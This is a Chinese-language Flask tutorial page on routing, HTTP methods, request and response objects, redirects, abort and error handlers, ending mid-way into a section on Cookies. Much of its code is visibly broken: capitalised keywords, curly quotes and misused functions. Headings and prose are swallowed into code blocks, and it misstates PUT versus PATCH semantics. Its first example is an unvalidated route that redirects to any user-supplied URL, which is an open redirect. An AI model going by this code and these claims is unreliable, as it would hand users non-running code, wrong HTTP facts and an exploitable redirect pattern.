<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params">‘/forward/&lt;path:url&gt;’</span>)</span></span><br><span class="line">Def forward(url):</span><br><span class="line"><span class="comment">#重定向url</span></span><br><span class="line"><span class="keyword">return</span> redirect(url)</span><br></pre></td></tr></table></figure>

<p>以上的路由配置，对于“/forward/<a target="_blank" rel="noopener" href="http://www.baidu.com”路径是合法的,如果将path转换器换成string有可能会出错./">http://www.baidu.com”路径是合法的，如果将path转换器换成string有可能会出错。</a></p>
<p>另外，path路径中可以接收多个参数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/add/&lt;bankName&gt;/&lt;int:page&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addCard</span>(<span class="params">bankName, page</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%s开户成功！在第 %s 页&quot;</span> % (bankName, page)</span><br></pre></td></tr></table></figure>

<p><strong>1.1.2</strong> <strong>路由的请求方法</strong></p>
<p>路由中的请求方法是通过methods设置的，且要求是list类型。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/find/&lt;keyword&gt;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">keyword</span>):</span><br><span class="line">    <span class="comment"># keyword有可能是银行的id，名称，地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;keyword 是string类型，值是 %s&quot;</span> %(keyword)</span><br></pre></td></tr></table></figure>

<p>上面的注册路由是没有指定methods，默认中包含GET和OPTIONS。</p>
<p>常见的请求方法：</p>
<p>*GET查询数据使用，可以上传的参数大小限于1M以内，参数是显示在请求地址中的。</p>
<p>*POST添加或编辑数据时使用，可以上传超过1G的大数据，且以表单参数的方式上传，并不显示请求地址中，相比于GET，请求参数比较安全且支持大数据或文件。</p>
<p>*PUT更新数据时使用，局部数据的修改，如修改用户的口令或头像</p>
<p>*PATCH批量更新数据时使用，整体的数据修改，如修改用户的收货地址、实名认证、绑定银行卡。</p>
<p>*DELETE删除数据时使用。</p>
<p>*其他的方法：OPTIONS、HEAD</p>
<p> 如声明一个处理函数，用于删除银行信息，正确的路由配置如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params">‘/<span class="keyword">del</span>/&lt;<span class="built_in">int</span>:bank_id&gt;’, methods=[“DELETE”]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete4id</span>(<span class="params">bank_id</span>):</span><br><span class="line">Return “删除操作成功！”</span><br></pre></td></tr></table></figure>

<p>针对PUT/DELETE/POST/GET等url接口测试，可以使用requests库。</p>
<p>Pip install requests</p>
<p>Requests库中提供相关函数，函数的名称与请求方法是一一对应，当然也可以使用requests.request()方法是最全的方法，其他的函数都是在request()方法之上重新封装的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:5000/bank/del/100&quot;</span></span><br><span class="line">method=<span class="string">&#x27;DELETE&#x27;</span></span><br><span class="line">resp = requests.request(method, url)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<p>也可以使用请求方法对应的requests库的相关函数，如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:5000/bank/del/100&quot;</span></span><br><span class="line">method=<span class="string">&#x27;DELETE&#x27;</span></span><br><span class="line">resp = requests.delete(url)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>



<p><strong>1.1.3</strong> <strong>路由的反向解析</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">From flask <span class="keyword">import</span> url_for</span><br><span class="line">From flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line">Blue = Blueprint(‘myBlueName’)</span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params">‘/add/&lt;bankName&gt;’</span>)</span></span><br><span class="line">Def add(bankName):</span><br><span class="line">...</span><br><span class="line"><span class="meta">@blue.route(<span class="params">‘/select’</span>)</span></span><br><span class="line">Def select():</span><br><span class="line">Return “&lt;a href=%s&gt;进入下一个页面&lt;/a&gt;” % url_for(‘myBlueName.add’, bankName=”中国银行”)</span><br></pre></td></tr></table></figure>

<p>Url_for(“函数名”， **kwargs)反向解析的是flask的路由注册的路径</p>
<p>Url_for(“蓝图名.函数名”, **kwargs)反向解析指定蓝图下的路由注册路径。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/add/&lt;bankName&gt;/&lt;int:page&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addCard</span>(<span class="params">bankName, page</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">        %s开户成功！在第 %s 页</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;%s&quot;&gt;返回首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % (bankName, page, url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;&lt;a href=&quot;%s&quot;&gt;银行卡开户&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;&lt;a href=&quot;%s&quot;&gt;银行管理&lt;/a&gt;&lt;/li&gt;    </span></span><br><span class="line"><span class="string">            &lt;li&gt;&lt;a href=&quot;%s&quot;&gt;用户管理&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % (</span><br><span class="line">        url_for(<span class="string">&#x27;cardBlue.addCard&#x27;</span>, bankName=<span class="string">&quot;中国银行&quot;</span>, page=<span class="number">3</span>),</span><br><span class="line">        url_for(<span class="string">&#x27;bankBlue.edit&#x27;</span>, bankId=<span class="number">1</span>),</span><br><span class="line">        url_for(<span class="string">&#x27;userBlue.find&#x27;</span>),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>1.2<strong>请求对象</strong></p>
<p>From flask import request</p>
<p>请求对象本质上是封装客户端发送的请求数据，在Flask中由Werkzeug库（实现Python的WSGI接口）封装的，包含请求的路径、请求的方法、请求的头、请求中包含的Cookie、请求的参数及上传的数据。</p>
<p> 一个请求对象中包含的数据的属性一般都是dict类型，如：</p>
<p>*request.args查询参数，url路径中使用?分隔的查询参数。</p>
<p>*request.form表单参数，一般是post请求方法中包含的数据。</p>
<p>*request.headers请求头</p>
<p>*request.cookies Cookie数据</p>
<p>*request.files上传的文件</p>
<p>*request.method请求方法，且大写字母表示的</p>
<p>*request.url 请求的路径</p>
<p>*request.remote_addr 远程访问的客户端ip地址</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>url: &#123;&#123; request.url &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>base_url: &#123;&#123; request.base_url &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>host_url: &#123;&#123; request.host_url &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>path: &#123;&#123; request.path &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>method: &#123;&#123; request.method &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>客户端ip: &#123;&#123; request.remote_addr &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>请求头: &#123;&#123; request.headers &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>Cookie: &#123;&#123; request.cookies &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/find&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;url&#x27;</span>, request.url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_url&#x27;</span>, request.base_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;host_url&#x27;</span>, request.host_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;path&#x27;</span>, request.path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;headers&#x27;</span>, request.headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;cookie&#x27;</span>, request.cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;user_list.html&quot;</span>, request=request)</span><br></pre></td></tr></table></figure>

<p>1.3 <strong>响应对象response</strong></p>
<p>在服务端，当业务处理完成后，生成响应的数据并封装成响应对象，并传给Python的WSGI，由WSGI向客户端发送数据流。</p>
<ol>
<li><p>直接返回文本和状态码</p>
<p>flask的处理函数如果直接返回文本或附带一个响应的状态码，则会自动封装一个简单Response对象，且数据类型默认为：text/html;charset=utf-8.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish_bank</span>():</span><br><span class="line">    <span class="comment"># return &quot;&lt;h3&gt;预发布银行公告&lt;/h3&gt;&quot;, 200</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span>, <span class="number">200</span></span><br></pre></td></tr></table></figure>

<p>如果返回的是一个html文本数据，可以使用render_template()函数，将写好的html模板经过渲染之后生成的html返回会更好些。</p>
</li>
<li><p>使用make_response(data, code)生成response对象。这种方式是较为常用的方式，通过生成的response响应对象，可以设置响应的header相关的信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish_bank</span>():</span><br><span class="line">    <span class="comment"># return &quot;&lt;h3&gt;预发布银行公告&lt;/h3&gt;&quot;, 200</span></span><br><span class="line">    <span class="comment"># return &#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;, 200</span></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">    code = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数据和响应的状态码封装到response对象中</span></span><br><span class="line">    response = make_response(data, code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据数据的类型，设置响应头</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></li>
<li><p>jsonify()快速生成json响应对象。此函数返回的也是一个response对象，只不过response对象的headerd已经设置了content-type属性为application/json。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   @blue.route(<span class="params"><span class="string">&#x27;/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">publish_bank</span>():</span><br><span class="line">       data = <span class="string">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">       code = <span class="number">200</span></span><br><span class="line">       <span class="keyword">return</span> jsonify(data, code)</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Response类生成响应对象。</span><br><span class="line"></span><br><span class="line">   ```python</span><br><span class="line"><span class="meta">   @blue.route(<span class="params"><span class="string">&#x27;/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">publish_bank</span>():</span><br><span class="line">       data = <span class="string">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class="line">       code = <span class="number">200</span></span><br><span class="line">       <span class="comment"># Response(response= None, status= None, headers = None, mimetype = None, content_type = None, direct_passthrough = False)</span></span><br><span class="line">       response = Response(data, code, content_type=<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">       <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<p>创建Response对象方法中，可以省略code，同时也可以将content_type改为mimetype。mimetype表示文件的数据类型，和content_type表示的含义相同。</p>
</li>
<li><p>重定向：在一个请求中，由于业务处理的要求，在处理业务之后，需要进入新的页面。而这个页面之前已经声明它的路由，则需要使用重定向的方式进入到下一页。</p>
<p>【注意】重定向也是响应对象，必须要返回。而且相对于浏览器或客户端再次发送新的请求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/list&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listCard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;card/list.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addCard</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 接收开户信息</span></span><br><span class="line">        bankId =request.form.get(<span class="string">&#x27;bank&#x27;</span>)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        phone =  request.form.get(<span class="string">&#x27;phone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证数据是否为空</span></span><br><span class="line">        <span class="comment"># 假如操作成功，进入页面中</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;bankBlue.listCard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET请求，响应的是开户页面</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;card/add.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>开户页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>开户页面<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/bank/add&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;bank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>--请选择银行--<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>中国银行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>中国工商银行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户名&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;手机号&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-请求异常"><a href="#1-4-请求异常" class="headerlink" title="1.4 请求异常"></a>1.4 请求异常</h2><p>请求异常，在请求处理过程中，验证某一数据出现的错误，可以中断请求。如果请求异常不是请求数据而引起的，或者说请求资源不存在或服务器发生异常，此时可以捕获异常。</p>
<h3 id="1-4-1-abort-中断"><a href="#1-4-1-abort-中断" class="headerlink" title="1.4.1 abort()中断"></a>1.4.1 abort()中断</h3><p>在请求处理函数中，可以直接调用abort()函数，中断业务处理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addCard</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 接收开户信息</span></span><br><span class="line">        bankId =request.form.get(<span class="string">&#x27;bank&#x27;</span>)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        phone =  request.form.get(<span class="string">&#x27;phone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> phone != <span class="string">&#x27;111222333&#x27;</span>:</span><br><span class="line">            <span class="comment"># 中断业务</span></span><br><span class="line">            <span class="comment"># abort(401) # 发出一个异常响应码</span></span><br><span class="line">            abort(Response(<span class="string">&quot;&lt;h3 style=&#x27;color:red&#x27;&gt;%s当前手机号不能被注册&lt;/h3&gt;&quot;</span> % phone,<span class="number">403</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证数据是否为空</span></span><br><span class="line">        <span class="comment"># 假如操作成功，进入页面中</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;bankBlue.listCard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET请求，响应的是开户页面</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;card/add.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>abort()两种写法：</p>
<p>1.abort(status_code); 2. abort(data, code, headers,…)</p>
<h3 id="1-4-2-捕获请求异常"><a href="#1-4-2-捕获请求异常" class="headerlink" title="1.4.2 捕获请求异常"></a>1.4.2 捕获请求异常</h3><p>通过相关的状态码，获取请求异常，并指定处理函数来响应异常的信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>) </span><span class="comment"># 指定状态码捕获</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">notfound</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>建议处理异常的函数写在与app对象同一个脚本中。</p>
<p>如果处理业务中抛出相关的异常或发生500的异常，则可以指定异常类捕获</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/list&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listCard</span>():</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;自定义异常&#x27;</span>)</span><br><span class="line">    <span class="comment"># abort(500)</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;card/list.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   @app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">handlerOfError</span>(<span class="params">error</span>):</span><br><span class="line">       <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 二、Cookie与Session技术</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.1 Cookie存储技术</span></span><br><span class="line"></span><br><span class="line">Cookie数据存储技术，它的数据存储在客户端（浏览器），在浏览器中会为每个站点（host）创建存储Cookie的空间出来，Cookie的数据存储以Key=Value形式，但是每个key都有生命周期（有效期）。一个完整的Cookie信息包含：名称、内容、域名、路径（/）、有效时间（创建时间、到期时间）、如查看chrome下localhost域名下的所有cookie数据：chrome://settings/siteData。在搜索Cookie的文本框中输入“localhost”，查出localhost站点之前创建的Cookie。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.1.1 向客户端写入Cookie</span></span><br><span class="line"></span><br><span class="line">使用response对象的set_cookie()方法可以向客户端添加Cookie。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        key: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        value: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">        max_age: t.<span class="type">Optional</span>[t.<span class="type">Union</span>[timedelta, <span class="built_in">int</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        expires: t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, datetime, <span class="built_in">int</span>, <span class="built_in">float</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        path: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="params">        domain: t.<span 